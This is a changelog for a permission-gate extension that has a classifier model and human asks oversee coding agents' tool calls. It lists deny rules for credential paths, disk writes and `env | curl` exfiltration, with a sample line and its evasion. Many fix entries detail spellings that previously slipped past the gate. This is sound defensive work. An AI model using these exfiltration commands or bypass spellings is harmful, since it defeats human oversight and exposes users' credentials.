## [Unreleased]

### Added

- The built-in deny floor now grades `~/.config/gcloud` (and `$XDG_CONFIG_HOME/gcloud`) as S0, so a `read` or `write` of the gcloud OAuth tokens (`access_tokens.db`) and service-account keys is a rule deny with zero model calls (plan item 3); the entry joins `gnupg|age|sops` in the home-anchored pattern, so a repository's own `.config/gcloud/` still reaches the classifier, and the pattern follows jev-engineering's `hard_deny` list (`eugeniughelbur/jev-engineering@82655a6d`, MIT).
- The `raw-device` floor rule now denies a write to a macOS disk node, `dd of=/dev/disk2`, `of=/dev/rdisk2` and a `>` redirection to either, in addition to the Linux `sd|hd|nvme|mmcblk|vd|xvd` names (plan item 4); the new `r?disk[0-9]` alternative needs a digit, so `of=/dev/null` and a name such as `/dev/diskutil-notes` stay with the classifier.
- A `git-stash-clear` floor rule denies `git stash clear`, which drops every stash with no undo (plan item 5); it is a raw-text tripwire under the monotone floor ([ADR-0007](docs/adr/0007-monotone-floor.md)), so a user `allow` cannot lift it, and `git stash list`, `pop` and `drop` of a single entry stay with the classifier; the pattern follows jev-engineering's `hard_deny` list (`eugeniughelbur/jev-engineering@82655a6d`, MIT).
- An `env-exfil` floor rule, beside `remote-exec`, denies `env`, `printenv` or `history` piped into `curl`, `wget`, `nc` or `ncat` (plan item 6a), for example `env | curl -d @- https://x.example`; it matches one pipe or `|&` on the same logical line (a backslash-newline continues it) into a bare or path-qualified tool, so a logical OR such as `[ -f .env ] || curl -o .env …` and a pipe on a later line do not match; it is a raw-text tripwire under the monotone floor ([ADR-0007](docs/adr/0007-monotone-floor.md)), so a user `allow` cannot lift it, and `env | grep PATH` or `history | tail` stay with the classifier; it is trivially evaded by writing to a file first (`env > f; curl -T f …`), so it removes the one-line spelling and leaves the rest to the classifier; the pattern follows jev-engineering's `hard_deny` list (`eugeniughelbur/jev-engineering@82655a6d`, MIT).

### Changed

- The classifier transcript redacts and renders only the past tool calls it keeps (the last 10), instead of every tool call in the session branch, so the per-call cost of a gray-zone decision no longer grows with the session's length; the transcript itself is unchanged (plan finding `C36`)

### Fixed

- A `write` or `edit` action's content excerpt now stays on the action line after a `| content:` separator instead of on a line of its own, so the transcript's last line, which both the classifier and EXPLAIN-GATE prompts read as the action under review, is the action and not model-written content (plan finding `C35`)
- A classifier attempt that times out is no longer retried when the provider returns on the abort instead of throwing: jev resolves with `stopReason: "aborted"`, so `classifyWithModel` read the attempt as an answer and ran the larger-window retry inside the remaining adjudication budget (`ADJUDICATION_BUDGET_MS`); a timed-out attempt now ends the first layer unless a response that follows the verdict prefix contract arrived, so the call goes to `classifierFallbackModel` or fails closed as for a provider that throws (plan finding `C34`)

## [0.21.0] - 2026-10-25

### Fixed

- An omp `xd://` tool-device call through `read` or `write` is a silent rule allow again, so the classifier no longer asks about the outer call of a device dispatch (such as `write xd://mcp__lazy_skills_server_load_skill {"name":"python-style"}`); v0.20.0 sent every device call to the classifier. A `write xd://<tool>` runs the tool through omp's tool wrapper, which emits the tool's own `tool_call`, so that nested call is still adjudicated on its own; a `read xd://...` returns documentation the host generates (`research/2026-10-25-xd-device-dispatch.md`). Writes to the devices that run host code with no nested call (`xd://resolve`, `xd://reject`, `xd://propose`, `xd://report_issue`, in any case), to the root `xd://`, to a topic URL, and to a name with any character outside letters, digits, `_` and `-` still reach the classifier (omp dispatches on the parsed URL, which drops empty credentials, an empty port, tabs, newlines and edge control characters, so `xd://:@resolve` reaches `resolve`), as does a device URL given to any other tool. The allow applies only on omp: pi registers no `xd` scheme and opens the text as the relative path `xd:/<name>`, so on pi an `xd://` target keeps the floor's path grade, S0 included (`write xd://foo_history` is denied as a shell-history file), but never its allow: an in-project `xd://` write reaches the classifier, as in v0.20.0, so a host the gate fails to detect as omp is never allowed silently. Self-protection, the floor, user `deny`, `denyPaths`, the `.omp` gate and the code-loading ask still run first, and a user `deny` regex now also tests an internal URL target as written, so `^xd://mcp__lazy_skills_` denies the device write; before, it saw only the resolved path form (`<cwd>/xd:/…`) ([ADR-0009](docs/adr/0009-tool-access-adapter.md)).
- An apply-patch hunk header indented with spaces or a tab (`  *** Update File: /etc/hosts`) is now read as a write target: omp trims both ends of a header line before it matches one (`crates/pi-edit/src/modes/apply_patch.rs`, 18.12.6), but the gate matched only flush-left headers, so a patch with one ordinary header and one indented header got a rule allow for the indented target without grading it ([ADR-0009](docs/adr/0009-tool-access-adapter.md)).
- A `grep`, `find`, `ls` or other scope-tool search of the filesystem root `/` now hits the `denyPaths` ask for every declared protected path beneath it; the subtree comparison appended a second separator to the root, so such a search skipped the ask and reached the classifier with the declaration unasked. For the same reason, a `denyPaths` entry that is the filesystem root itself now covers every path beneath it, so every file call asks (headless: denies) (`C11` in `docs/plans/simplify-and-comments.md`).
- On macOS and Windows, self-protection ([ADR-0005](docs/adr/0005-self-protection-layer-restored.md)) compares its protected directories (the installed package or module directory, `verdicts/`, and the ancestors of a read-denied path) case-folded, as `denyPaths` already did, so a case-variant spelling such as `<agentDir>/VERDICTS/` is denied; the exact protected files and the bash signatures still compare case-sensitively. Linux is unchanged.
- A subagent ask shown on the root session's UI no longer outlives omp's per-handler budget `extensionHandlers.toolCallTimeoutMs` (default 30000 ms), which omp does not pause for a dialog outside the handler's own `ctx.ui`: before, omp blocked the call with `Extension … timed out` while the dialog stayed open, and a late Yes was recorded as `human` but did nothing (`research/2026-10-24-subagent-ask-timeout.md`). On omp the gate now reads the effective budget through the legacy `SettingsManager.create(cwd)` (the merged value omp enforces, from `rawValue`; the omp default when unset, invalid or unreadable) and closes the dialog `HOST_BUDGET_MARGIN_MS` (3 s) before the budget ends, measured from the start of the handler, or at `subagentAskTimeoutMs` when that comes first. When the budget ends the wait, the root UI gets a notice naming the budget and the value to set (`subagentAskTimeoutMs + 60000`), and the call is denied as `subagent-expired` without consulting the second model (audit `resolution: "timeout"`); a window under `MIN_SUBAGENT_DIALOG_MS` (2 s) skips the dialog and takes that path at once. When `subagentAskTimeoutMs` ends the wait, the ask resolves without a human as before, the second model bounded by the host budget. The subagent dialog title shows the time left when the dialog opens, a queued subagent ask stops waiting when its deadline passes, and a root session with a UI and `subagentGate: "normal"` warns once at session start when the budget is below `subagentAskTimeoutMs + 60000`. Root-session asks and pi are unchanged.
- The `git-push-force` floor rule no longer misses a force flag that follows a redirection holding `&` or `|`: the shell-word view read the `&` of `2>&1` as a command operator, so `git push origin main 2>&1 --force` put `--force` in a separate command, the word view cleared the raw-text tripwire's hit, and the call reached the classifier instead of the floor deny ([ADR-0007](docs/adr/0007-monotone-floor.md)). `>&`, `<&`, `&>`, `&>>`, `>|` and `<>` are now read as one redirection together with their target word and an unquoted file-descriptor number or `bash` descriptor variable (`{fd}>x`) before them (a quoted or escaped digit, as in `'2'>x` or `\2>x`, stays an argument, as in `bash`); `&&`, a background `&` and `|&` still separate commands. A user `allow` rule no longer admits a command containing `&>`, which POSIX `sh` reads as a background `&` followed by a redirection.
- The `git-push-force` floor rule now finds `env`'s split-string form after an `env` option that takes an argument: the scan stopped at the argument of `-u`, `-C`, `--unset` or `--chdir`, so `env -u HOME -S '<force push>'` and `env -C /tmp -S '…'` reached the classifier instead of the floor deny ([ADR-0007](docs/adr/0007-monotone-floor.md)). `env`'s options are now scanned left to right as `env` parses them: `-u`, `-C`, `-a` and `-f` and their long forms `--unset`, `--chdir`, `--argv0` and `--file` consume the next word unless the argument is attached (`-uHOME`, `--unset=HOME`), and `-S` anywhere in a short-option bundle, `--split-string` or a prefix of it (`--split`) marks the parse unsound, so the tripwire's deny stands.
- The `git-push-force` floor rule no longer denies a `git push` whose `+word` is an option's value, or a `push` that is not git's subcommand: it treated every later `+word` as a forced refspec and fired on any `push` word after `git`, so `git push -o +x origin main`, `git push --push-option +x origin main` and `git stash push -- +file` were denied; they now reach the classifier ([ADR-0007](docs/adr/0007-monotone-floor.md)). The word after `-o` (also at the end of a short-option bundle such as `-uo`), `--push-option`, `--receive-pack`, `--exec` or `--repo` is read as that option's value, an `f` after `o` in a bundle (`-of`) is `-o`'s value, and `push` must be git's subcommand, read past git's global options (`-C <dir>`, `-c <key>=<value>`, `--git-dir`, `--no-pager` and the rest of git's documented list). When a `push` word follows later in the same command, an unmodelled git global option keeps the deny, since it may take a value that hides the subcommand, and so does a word holding a parameter expansion or glob (`$`, `*`, `?`, `[`, `{`) among git's global options or in the subcommand position, since it may expand to no word or to several (`git $UNSET push --force`). A `+word` stays a forced refspec wherever git push reads it as one, so a force push spelled with a real push option value before the refspec (`git push -o ci.skip origin +main`) still denies, as does every force-push spelling in the probe case table and the test suite.
- The `git-push-force` floor rule now denies a `-f` bundled with git push's digit options `-4` (`--ipv4`) or `-6` (`--ipv6`): the raw-text tripwire and the word view both read a short-option bundle as letters only, so `git push -4f origin main` force-pushed with no tripwire hit and reached the classifier ([ADR-0007](docs/adr/0007-monotone-floor.md)). Both now accept digits in the bundle (`-4f`, `-6uf`, `-f4`).

## [0.20.0] - 2026-10-24

### Added

- **BREAKING (headless runs that install extensions or edit host config)**: the code-loading ask ([ADR-0011](docs/adr/0011-code-loading-ask.md)), a built-in rule-layer ask after the `denyPaths` asks and before the over-cap ask and user `allow` (layer 4a in `docs/layers.md`). A write where omp or pi loads code in a later session asks a human: an agent directory's `extensions/`, `hooks/`, `tools/`, `commands/` (omp) or `extensions/`, `npm/`, `git/`, `bin/` (pi), its `mcp.json`, `.mcp.json`, `models.yml`, LSP and DAP config (`{,.}{lsp,dap}.{json,yaml,yml}`), `models.json` and `trust.json`, and its general config files `config.yml` and `settings.json`; the omp plugin roots `~/.omp/plugins/` and `~/.omp/profiles/<name>/plugins/` (and the same under `$XDG_DATA_HOME/omp/` when that variable is absolute); any project's `.omp/{extensions,hooks,tools,commands,plugins}/`, `.omp/{mcp.json,.mcp.json,config.yml,settings.json}`, the LSP and DAP config in `.omp/`, `.pi/{extensions,npm,git}/` and `.pi/settings.json`; `mcp.json`, `.mcp.json` or an LSP or DAP config file directly in the call's working directory; and the LSP and DAP config files in the home directory. The agent directory is the resolved `<agentDir>` (honouring `PI_CODING_AGENT_DIR`) and any `.omp/agent`, `.omp/profiles/<name>/agent` or `.pi/agent` path. A target naming a directory that holds such locations (an agent directory itself, a `.omp` or `.pi` directory, `~/.omp`) asks too, so `tar -C ~/.omp/agent`, `cp -r x ./.omp/` and `ln -s ~/.omp/agent a` ask. A file tool's write targets count, also in the form rebuilt from the nearest existing ancestor (a new file under a symlink to an agent directory), and a read does not; a shell command or eval cell asks on any path token in the set or a bare working-directory launcher name, a shell command with `$PWD`, `$(pwd)` and `$PI_CODING_AGENT_DIR` expanded, so a command that only reads such a path asks too; `ast_edit` also asks when such a location exists inside the subtree it edits. A path that is also a `denyPaths` declaration keeps the protected-path ask with its path withheld. A user `allow` rule or `tools` entry cannot skip the ask, and a non-interactive session or an unanswered subagent ask denies it, so a headless run can no longer install an extension or edit `config.yml`, `settings.json` or `mcp.json`. The reason names the location class and the path, and the dialog keeps the Explain option. `builtinDenyFloor: false` turns the ask off with the floor; self-protection still denies writes to the gate's own files first.

### Changed

- In a non-interactive session, a block that came from a rule ask (an opaque write, an over-cap action) or a classifier ask now says `ask degraded to block in non-interactive mode`, as a `denyPaths` block already did, so the agent can tell that a human could have allowed the call.

### Fixed

- An omp `xd://` tool-device URL is no longer graded as a file path by the built-in floor, which denied a `read` or `write` of a device whose tool name ends in `_history` (such as `xd://mcp__sequential_thinking_get_thinking_history`) as an S0 shell-history file; a device call now reaches the classifier, and the tool it runs is still gated as its own call. A `write` to an `xd://` URL was previously allowed by the floor as an in-project write; it now reaches the classifier too.

## [0.18.1] - 2026-10-24

Patch release for omp 18.12.6: path spellings the new host version resolves, its SQLite credential store, and two subagent auto-resolve holes.

### Fixed

- The first-run config template's `_hint` text links this repository's `docs/configuration.md` instead of upstream's, names the real `classifierFallbackModel` triggers (a fail-closed first layer, or a jev confidence below `classifierMinConfidence`) in place of the removed `classifierFallbackConfidence`, and no longer offers `task` as an example `tools` entry, since listing `task` would let subagent launches bypass the subagent gate. Existing configs are not rewritten.
- Host path grading follows omp 18.12.6 ([ADR-0009](docs/adr/0009-tool-access-adapter.md) amendment): a `read` with the JSON filter `?query=` (`read <auth file>?query=.`) is graded as the file the host opens, so the S0 floor and `denyPaths` apply instead of a mechanical allow; `mr://` (GitLab merge-request diffs) is a host internal URL scheme that goes to the classifier like `pr://`; and read selectors that mix ranges and tails (`path:1-12,-15`) or repeat the list colon (`path:1-30,:-30`) are peeled as the host peels them, so a benign in-project read keeps its rule allow while protected files stay denied under every variant.
- A hashline `edit` header is graded in every form omp recovers from it: a placeholder tag (`[.git/config#AUTO]`, `#????`, `#0`, a bare `#`), trailing whitespace on the line, an apply-patch prefix (`[*** Update File: path#TAG]`) and an envelope marker in front (`[*** Begin Patch] [path#TAG]`) no longer hide the target, and a `write` path wrapped as a header with a trailing space (`"[.git/config] "`) is unwrapped as the host unwraps it. Each of these spellings was a mechanical allow, including writes to `.git/config`.
- omp's settings and auth database `agent.db` is an S0 credential store: `.omp/agent/agent.db`, `.pi/agent/agent.db`, omp's XDG location (`$XDG_DATA_HOME/omp/agent.db`, where XDG flattens the `agent/` level) and `<agentDir>/agent.db` under a custom `PI_CODING_AGENT_DIR`, with their `-wal`, `-shm` and `-journal` files and any `:table` or `?q=` selector, are denied without a classifier call. omp 18.12.6 keeps its credentials there, and its `read` tool opens SQLite files.
- The single-file install (`pi-verdict.ts` and `jev-adapter.ts` copied into `<agentDir>/extensions/`) self-protects the copied `jev-adapter.ts` as well, by exact path and in bash commands; an agent could otherwise change the gate by rewriting the adapter it imports. The directory install was already covered.
- A subagent ask that no human answers is never auto-allowed once the confidence cascade has ruled on it: a demoted first-layer ask that the `enforce` fallback would allow now denies, as the [ADR-0004](docs/adr/0004-classifier-fallback-cascade.md) carve-out intends. With `classifierFallbackMode: "shadow"`, an unanswered subagent ask still consults the second model and records its opinion (`fallback.effective: "deny"`), but denies, since a shadow opinion never changes an outcome.
- The protected-path ask no longer matches the bare home-relative tail of a `denyPaths` entry: with `denyPaths: ["~/.config/age/"]`, a read of `<project>/.config/age/data` no longer asks, while `~/`, `$HOME` and `${HOME}` spellings of the entry still do. Transcript redaction keeps the tail.
- The `denyPaths` bash extraction reads quoted and braced home expansions as `$HOME`: `"$HOME"/…`, `"${HOME}"/…`, `${HOME}/…`, a quote between the expansion and the slash (`$HOME"/…"`), and `${HOME:-…}`-style defaults, whose default word is also checked, so a command spelling a protected path this way asks deterministically. A single-quoted `'$HOME'` stays literal, as in the shell.

## [0.18.0] - 2026-10-07

Changes since `v0.17.0`: the tool-access adapter round ([ADR-0009](docs/adr/0009-tool-access-adapter.md), [ADR-0010](docs/adr/0010-policy-degraded.md)), the fixes from its review, and host path resolution, which grades each path the way omp 18.6.1 resolves it.

### Added

- **Tool-access adapter** (`toolAccess`, [ADR-0009](docs/adr/0009-tool-access-adapter.md)): one host-agnostic model of what a tool call reads or writes, replacing the single `input.path` read every file-tool consumer (user rules, `denyPaths`, the built-in floor, self-protection) used. Recognizes a plural `paths` field, a hashline-wrapped `path`, and — parsed directly out of a patch's `input`/`_input` text — hashline file headers (`[PATH]`/`[PATH#TAG]`, legacy `¶PATH`), `MV DEST` op lines, the apply-patch `*** Add/Update/Delete File:`/`*** Move to:` lines, and patch-mode `edits[].rename` values. `glob` and `ast_grep` join `grep`/`find`/`ls` as subtree-scoped tools; `ast_edit` joins `write`/`edit` as a known mutating tool.
- **Session-start coverage report and side-effecting tools warning** (item 4): a debug-gated (`--auto-mode-debug`/`PI_AUTO_MODE_DEBUG`) one-time note lists any active tool — outside the adapter's known names and the user's `tools` allowlist — whose declared schema exposes none of `path`/`paths`/`input`/`_input`/`code`/`command`/`content` (stays classifier-only forever) or exposes one under an unrecognized type (the adapter silently treats it as absent); an unconditional warning fires once when `tools` lists a persistent-memory tool (`learn`, `memory_edit`, `retain`) — these calls bypass the classifier entirely.
- **Bounded write/edit content excerpt** (item 6a): a `write`/`edit` action's classifier transcript line now carries up to 2000 chars of the write `content` or the patch text, behind an explicit `[excerpt: N of M chars]` marker — the classifier judges payload, not just path.

### Changed

- **BREAKING**: project overrides now narrow by direction (item 3, [ADR-0006](docs/adr/0006-fork-posture-and-override-hardening.md) amendment): a per-key direction table replaces the verbatim-copy merge — `footer` is user-only; `gateOmpDir`/`notifyAllows` may only be set `true`; `classifierFallbackMode` only `"shadow"`; `subagentGate` only `"normal"`; `subagentAskTimeoutMs` applies only when strictly greater than the user's effective value, capped at 2^31−1 ms for both configs (F12); a rejected widening is ignored with a skipped-note naming the key instead of being silently dropped. `docs/configuration.md`'s stale overridable list (`autoDeny`/`audit`/`classifierMinConfidence`/`classifierFallbackModel` claimed, never allowed) was corrected in the same commit.
- **BREAKING**: a multi-header omp `edit` (two or more hashline file headers in one patch) is now graded on every target the patch touches, not on `input.path` alone — omp itself leaves `path` unset once a patch crosses two headers, which previously let the whole edit through as a silent in-project write allow regardless of what its other headers touched (item 1; [ADR-0009](docs/adr/0009-tool-access-adapter.md)).
- **BREAKING**: a `write`/`edit`/`ast_edit` call whose payload names no target at all (an empty path, a patch whose grammar is unrecognized, or an omitted `paths` on `ast_edit`) is now a deterministic ask instead of a silent in-cwd allow (the opaque-ask rule).
- **BREAKING**: a tool listed in `tools` now faces the deterministic `denyPaths`/`gateOmpDir` ask if its extracted target is protected, instead of a silent allow — the `tools` exact-name exemption is checked after the deny-side layers, not before.
- **BREAKING**: an unknown tool's path-shaped payload fields now reach the `denyPaths`/`gateOmpDir` ask, where previously nothing graded them; its fields still never reach user `deny`/`allow` regex matching (unchanged — an MCP tool's payload cannot accidentally satisfy a user rule).
- An observing tool's (`read`/`grep`/`find`/`ls`/`glob`/`ast_grep`) `path` is now additionally split on `;`, `,` and whitespace for `denyPaths` and the built-in floor — omp's `read` opens each part of such a list separately while the gate previously graded only the whole string as one path.
- Self-protection (layer 0) now also tests every tool-access adapter target and, for `eval`'s code text, the command-direction substring signatures — an apply-patch line or an `eval` shell-out touching the gate's own files no longer bypasses it.
- A multi-target write's ask dialog detail and classifier transcript action line now name every target, not just the first or a raw JSON dump.
- **BREAKING**: `eval` (`kind: "code"`) now has its own grading (item 4; [ADR-0009](docs/adr/0009-tool-access-adapter.md) Phase 3 amendment): user `deny`, `denyPaths` and the `gateOmpDir` `.omp` word check now test the whole code text (previously ungraded — a silent gray fall-through to the classifier regardless of any of these); the built-in bash floor now applies to a `language: "py"` cell's extracted shell-out lines only (`!cmd`, a `%%bash` cell body) — never the whole code text (verified against the upstream `oh-my-pi` source at tag `v18.6.1`, matching the installed version). User `allow` and the `tools` exact-name exemption now explicitly exclude `kind: "code"` — a code call always reaches the classifier (or an earlier deny/ask) instead of a mechanical allow; a user who listed `eval` in `tools` loses that exemption.
- **BREAKING**: the action under review is no longer silently truncated at 1000 characters before the classifier sees it (item 6a, Claude-review F8): it gets its own 8192-char budget (`BASH_MAX_MATCH_LEN`, the built-in floor's own reading horizon) — the tool name, every adapter target, and the full command or eval code count toward it; a write/edit content excerpt and a gray tool's raw JSON arguments are bounded separately and never count toward it. An action over the 8192-char budget is now a deterministic **ask** (non-interactive sessions degrade to deny), checked after the deny-side layers but **before** your `allow` rules — a command or eval cell longer than the floor's own danger-regex reading horizon could previously still be rule-allowed on a tail the floor never read (F8's ordering gap); that silent pass-through is gone. Verified safe against both jev transports' documented limits (TypeSafe's 32k-token `state` budget, `docs.typesafe.ai/models`) before raising any cap — see `docs/configuration.md`.
- The audit record's `actionLine` (local, full-fidelity per ADR-0002) now carries the same uncapped action text as the classifier transcript, instead of a 1000-char-truncated copy.
- Past tool calls naming a `denyPaths`-declared path are now redacted out of every model-bound transcript (the classifier's, and the EXPLAIN-GATE role's — F10) before `transcriptSafe` truncates anything: one predicate built from `cwd` + the anchored bases tests the structured tool-access extraction *and* the raw arguments JSON (absolute, `~/`, `$HOME`/`${HOME}`, or the home-relative tail), and a hit replaces the whole line with the fixed marker `<protected-path>`. User-message lines are deliberately untouched — a user's own disclosure in their own message is theirs (PC-review F5c). Recorded residual: detection is literal and inherits the extractor's documented obfuscation holes (command substitution, base64, archiving), so the classifier's existence hint stays the backstop for those calls; audit records keep full-fidelity plaintext since they never leave the machine ([ADR-0002](docs/adr/0002-deny-paths-deterministic-ask.md) amendment). The same predicate also covers the cwd-relative spelling of an in-cwd base and command/code tokenization through `denyPathForms`, and the subagent second-model prompt — the held action line included — sits behind it too.
- **BREAKING**: configuration errors now change the fail direction (item 6c, [ADR-0010](docs/adr/0010-policy-degraded.md)): a config parse failure, a load exception, a trusted-project parse/shape failure, or any skipped `deny`/`denyPaths` entry sets `policyDegraded` for the session — **every model-originated allow is withheld**: the first classifier layer and the confidence-cascade fallback become an ask (`source: "degraded-policy"` on `Verdict` and the audit record, headless → deny) and a subagent second-model allow is denied outright (no human is left to ask); user `allow`/`tools` are suspended in the rule layer (moot on a total parse failure — both lists are already empty; applied for the skipped-entry case where an `allow` list survived while a `deny` entry was dropped). The built-in floor and every deny-side layer are unchanged. The state is named in a footer risk badge, in `/automode` status, in every block reason, and by an explicit session-start warning.
- The eval shell floor (item 4) now also trips on a py cell's **direct shell-API lines** (`__omp_shell(`, `subprocess.*`, `os.system(`): these shell out without a `!` line, since omp injects `__omp_shell` into the cell namespace. Recorded residual: js cells get no equivalent extraction — their code text still feeds user `deny`/`denyPaths`/`.omp` and the classifier, which remains the backstop ([ADR-0009](docs/adr/0009-tool-access-adapter.md) Phase 3 amendment).
- Protected-path redaction now also covers the **current action under review** and **notifications**: when the held action's text names a `denyPaths` base (e.g. a `${HOME}` spelling the denyPaths tokeniser cannot extract, so no ask fired), the classifier/cascade/EXPLAIN-GATE prompts receive the fixed `<protected-path>` marker instead of the action or its excerpt, and every block/allow notification substitutes the marker for the action line — the same invariant the protected-path branch already stated. The local audit record and the local confirm dialogs keep the full text (ADR-0002's boundary: only payloads leaving the machine are scrubbed).
- **BREAKING**: the gray-zone path now runs under one end-to-end **27 s adjudication budget** (item 7) instead of letting every step spend its own cap — the documented worst case (25 s + 25 s first layer, 15 s + 15 s fallback) outlived omp's default `extensionHandlers.toolCallTimeoutMs` (30 000 ms) and the handler was killed mid-cascade. Each attempt gets `min(its cap, deadline − now − reserve)`, and the reserve is held for the fallback only when `classifierFallbackModel` is configured: without one the first layer keeps its full 25 s, with one its first attempt gets 12 s. A **timed-out attempt is no longer retried** — the retry tier stays for unusable answers, while a timeout goes straight to the fallback — so a slow first layer cascades instead of being host-killed (this gateway's measured p90 of 19.8 s makes that the honest trade; recorded in `docs/configuration.md`). The budget is a hardcoded constant: the extension cannot read the host's configured bound, and raising that bound helps the subagent ask path (`subagentAskTimeoutMs`) instead.
- The fork's own scope now matches everywhere (item 8): `publish.yml` publishes `@jonatsu/pi-verdict` — it still configured upstream's `@frapetti-dev` scope, so a Release would have targeted a package this fork cannot publish — and the README's install commands, its host-table extension-copy path (`~/.omp/plugins/node_modules/@jonatsu/pi-verdict/`), its `.npmrc` scope mapping, `AGENTS.md` and `TODO.md` follow. Supply chain: every GitHub Action in `ci.yml`/`publish.yml` is pinned by commit SHA and Bun is pinned to `1.4.2` instead of `latest`. Docs sync: `AGENTS.md` corrected on the `gateOmpDir` default (off — the `/verdict` switch now marks Off as the default too), the `classifierFallbackMode` default (`enforce`), the removed shadow cache, the rule-layer chain's self-protection layer 0, and the ADR-0001 → ADR-0005 self-protection history; ADR-0002's 2026-09-25 amendment and ADR-0001 both gained their ADR-0005 pointers.

### Fixed

- Protected-path redaction no longer treats a root `denyPaths` entry (`/` or a drive root) as an empty spelling that matches every string: `redactorFor` stripped the trailing separator with a negated string, which sliced to `""`, so every transcript line and action was replaced by `<protected-path>`. A root base now redacts only calls that actually name a path.
- A type-invalid `deny` or `denyPaths` value now degrades the policy instead of vanishing silently ([ADR-0010](docs/adr/0010-policy-degraded.md)): a present `deny`/`denyPaths` that is neither a list nor a single string, and each non-string `deny` entry, is named in the session-start skip note and sets `policyDegraded`, so model allows are withheld as they already were for an uncompilable regex. The project-override merge now keeps such values instead of dropping them, so a trusted project config cannot hide one either. A single string for `deny` or `denyPaths`, in the user or a trusted project config, is read as a one-element list with a skip note naming the key and does not degrade, because its intent is unambiguous. A non-array or non-string `allow` value is named in the skip note too, without degrading, because a dropped allow cannot widen the gate.
- A wildcard in a scope tool's path no longer defeats the built-in floor or `denyPaths` ([ADR-0009](docs/adr/0009-tool-access-adapter.md) amendment): `grep`, `find`, `glob`, `ast_grep` and `ast_edit` targets are graded twice, as spelled and by their literal prefix before the first path segment containing `*`, `?`, `[` or `{`, and the worst grade wins in the floor, `gateOmpDir` and `denyPaths`, so `~/.ssh/*.pub` is an S0 deny through its prefix, `**/*.pem` is an S0 deny through its spelling, and `**/*.json` grades as the cwd prefix and asks when a declared base sits inside it. A target that still contains a metacharacter never gets a rule allow: the floor's allow becomes gray (classifier), and the user `allow` loop and the `tools` exemption are skipped for that call. Previously `ast_grep` with `path: "~/.config/g?/hosts.yml"` or `glob` with `path: "~/.ss?"` was a silent rule allow with no model call. A backslash in these tools' paths is read as a slash on every platform, as omp does, so `~\.ssh\id_rsa` is graded like `~/.ssh/id_rsa`. A literal path that contains one of these characters, such as a `[id]` directory, now reaches the classifier instead of a rule allow when passed to one of these tools.
- A call that names a protected path through a spelling the `denyPaths` tokeniser misses, such as `cat ${HOME}/.ssh/id_rsa` against `denyPaths: ["~/.ssh/"]`, is now a deterministic protected-path ask (headless: deny) with no model call, instead of a classifier call that saw only the `<protected-path>` marker in place of the action ([ADR-0002](docs/adr/0002-deny-paths-deterministic-ask.md) amendment). The ask sits in the rule layer right after the `denyPaths` hit check, so a user `allow` rule or `tools` entry cannot override it (ADR-0002: a protected path overrides the user's own allow rules); only the floor and user `deny` run before it. It uses a strict form of the redactor that needs path-word boundaries on the raw spelling, so `bun test tests/secrets-loader.test.ts` is not matched by a declared `<cwd>/secrets`; the transcript redaction itself stays wide. It carries no matched-path detail, and a subagent in `auto` mode holds such a call with no second-model consultation.
- The subagent second model (`classifierFallbackModel` consulted when no human can answer an ask, `subagentGate: "auto"` or a timed-out dialog) now judges the same uncapped action line the first classifier saw, instead of the notification form that `transcriptSafe` cuts to 600 head and 400 tail characters with `…[truncated]…` in the middle. A long command with its payload in the middle could previously be allowed by a model that never read it.
- The EXPLAIN-GATE prompt no longer carries a rule-layer reason that names a protected path: with `autoDeny: false` a built-in floor deny becomes an ask that offers Explain, and its reason (for example `S0 secrets/credential path: <path>`) was sent to the model provider while the action line and detail were already redacted. When the transcript redactor matches the call, the gate line now reads `<label>: <protected-path>`. The starter `denyPaths` (`~/.ssh/`, `~/.gnupg`) overlap the S0 floor, so the default config was exposed. Local dialogs and notifications are unchanged.
- Transcript redaction now catches the spellings `hitDenyPaths` already catches on Windows and macOS ([ADR-0002](docs/adr/0002-deny-paths-deterministic-ask.md)): on a case-insensitive platform the structured and raw checks compare case-folded, so `SECRETS/n.txt` against a declared `<cwd>/Secrets` is redacted; the raw check runs over the argument string values as well as the JSON text, whose doubled backslashes never matched a multi-segment `C:\...` spelling, and treats `\` and `/` alike on win32; and command tokens get the win32 backslash-to-slash step that `denyPathCandidates` applies. Previously such a call that the user approved, or that the redactor alone matched, reached later classifier, fallback and EXPLAIN-GATE prompts in plaintext. `redactorFor` takes the platform as a parameter so each branch is unit-tested on any host.
- A scope tool (`grep`, `find`, `ls`, `glob`, `ast_grep`, `ast_edit`) whose target strictly contains a home-anchored S0 directory, such as `grep` over `~/.config` or `~`, is no longer a silent rule allow: the search walks into `~/.config/gh` and the other credential directories, so the call is gray and reaches the classifier ([ADR-0009](docs/adr/0009-tool-access-adapter.md) amendment). The set is `~/.ssh`, `~/.aws`, `~/.gnupg`, `~/.kube`, and `~/.config/{gnupg,age,sops,glab-cli,gh}`; a plain `read` of a directory is unchanged.
- An opaque mutating call (a `write`/`edit`/`ast_edit` whose patch text does not parse, or that names no target) no longer slips through a user `allow` regex or a `tools` entry ([ADR-0009](docs/adr/0009-tool-access-adapter.md) amendment): the model-supplied `path`/`paths` beside unparseable patch text counted as targets for the allow loop, so `allow: ["^<cwd>/"]` turned the call into a silent rule allow. Both user-allow paths are now skipped for an opaque call, which always reaches the deterministic ask (headless: deny), as it does without any allow rule.
- A path spelling that omp rewrites before it opens the file no longer grades as the harmless text the model wrote ([ADR-0009](docs/adr/0009-tool-access-adapter.md) amendment): every file or scope target is now graded as spelled and as the host expands it (`expandHostPath`, mirroring omp's `expandPath`: a stray leading `:`, the `@` shorthand before `/`, `~`, `~/`, a Windows absolute path or a registered internal scheme, unicode spaces, a `file://` URL with its percent escapes, a `\\?\` prefix, then the tilde), and the worst grade wins in the built-in floor, `denyPaths`, `gateOmpDir`, self-protection and the transcript redactor. A user `deny` regex matches if any form matches; a user `allow` regex admits a call only if every form matches. Under WSL (`WSL_DISTRO_NAME` or `WSL_INTEROP` set) a Windows drive path is also graded as its mount, as omp opens it (`C:\Users\x\.ssh\id_ed25519` is `/mnt/c/Users/x/.ssh/id_ed25519`). Before, `read` of `@~/.config/age/keys.txt` or of a `file://` URL naming an XDG credential file, and `write` of `@/etc/cron.d/x`, were rule allows with no model call and no human.
- A read selector suffix no longer hides a credential file from the built-in floor ([ADR-0009](docs/adr/0009-tool-access-adapter.md) amendment): `read` and `grep` now also grade the path with the trailing selector peeled the way omp peels it (`:N-M`, `:-N`, `:raw`, `:conflicts`, `:img`, or one range plus `:raw`), so `.env:raw`, `~/.netrc:1-50` and `key.pem:1-5` are denied like the plain names; the `$`-anchored S0 patterns missed the suffixed spelling and the call was a rule allow with no model call. A real file whose name merely holds a colon (`foo:bar`) keeps its verdict.
